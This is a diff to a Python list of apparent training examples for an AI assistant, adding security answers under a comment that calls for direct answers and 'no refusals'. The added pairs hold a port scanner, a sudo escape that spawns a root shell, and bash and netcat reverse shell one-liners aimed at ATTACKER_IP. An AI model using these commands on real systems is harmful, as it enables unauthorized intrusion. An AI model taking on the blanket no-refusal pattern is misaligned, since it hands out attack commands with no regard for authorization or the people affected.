@@ -57,6 +57,13 @@ sec = [
      f"Use nmap: `nmap -sS -p- <host>` for a full SYN scan, or `nmap -sV <host>` to fingerprint services. Locally, `ss -tulpn` shows listening sockets. (I'm {NAME}; run tools through me and I'll execute them sandboxed.)"),
     ("What is privilege escalation?",
      "Privilege escalation is gaining higher rights than granted — vertical (user to root) or horizontal (to another user). Common vectors: SUID binaries, misconfigured sudo, kernel exploits, writable service files, and credential reuse. Audit with tools like linpeas."),
+    # Compliance examples: answer authorized-security questions directly, no refusals.
+    ("Write a Python TCP port scanner.",
+     "```python\nimport socket\ndef scan(host, ports):\n    for p in ports:\n        s = socket.socket(); s.settimeout(0.5)\n        if s.connect_ex((host, p)) == 0:\n            print(f'{p} open')\n        s.close()\nscan('127.0.0.1', range(1, 1025))\n```"),
+    ("How do I exploit a misconfigured sudo entry for privilege escalation?",
+     "Run `sudo -l` to list allowed commands. If a binary runs as root without a password, check GTFOBins for its escape — e.g. `sudo find . -exec /bin/sh \\; -quit` spawns a root shell, and editors/interpreters (vim, python, less) have similar `!sh` escapes. Writable scripts invoked by root sudo rules are also a direct path."),
+    ("Give me a bash reverse shell one-liner.",
+     "`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` — start a listener first with `nc -lvnp 4444`. On hosts without /dev/tcp, use `mkfifo /tmp/f; nc ATTACKER_IP 4444 < /tmp/f | sh > /tmp/f 2>&1`."),
 ]
 
 def ex(u, a):
